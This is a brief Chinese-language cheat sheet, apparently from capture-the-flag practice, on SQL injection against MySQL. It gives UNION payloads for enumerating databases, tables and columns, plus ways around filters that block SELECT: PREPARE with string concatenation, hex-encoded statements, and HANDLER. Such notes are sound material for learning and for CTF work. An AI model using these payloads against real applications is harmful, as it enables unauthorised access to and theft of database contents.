# WEB

## SQL注入

### 1、SQL注入基本语句

#### 1.1 union  查询

```sql
# 查询数据库
union select 1,group_concat(database()),3 -- -
# 查询数据表
union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()-- -
# 查询字段名
union select 1,2,group_concat(column_name) from information_schema.columns where table_name=table_name
```

### 2、查询纯数字的表名是需要使用`反引号`包裹

例如：show columns from \`1919810931114514`;

### 3、当select被过滤时怎么怎么查询字段数据

#### 3.1、通过预编译预编译的方式拼接select 关键字

格式：

```sql
PREPARE 名称 FROM 表名 WHERE 条件;
[SET @x=xx];
EXECUTE 名称 USING @x;
```

举例：查询ID为1的用户

```sql
PREPARE a FROM concat('s','elect','* FROM 表名 WHERE user_id=?');
SET @ID = 1;
EXECUTE a;
```

#### 3.2、通过预编译的方式将select 查询语句进行16进制编码

举例:查询ID唯一的用户

```sql
select * from tableName where user_id=1
-- 编码后
PREPARE a from 73656c656374202a2066726f6d207461626c654e616d6520776865726520757365725f69643d31;
EXECUTE a;

PREPARE a from 0x73656c656374202a2066726f6d20603139313938313039333131313435313460;
EXECUTE a;
```

### 3.3、通过handle进行查询

注意：handle不是通用的SQL语句，是Mysql特有的，可以逐行浏览某个表中的数据

格式：

```sql
-- 打开表：
HANDLER 表名 OPEN ;
-- 查看数据：
HANDLER 表名 READ first;
HANDLER 表名 READ next;
-- 关闭表：
HANDLER 表名 READ CLOSE;
```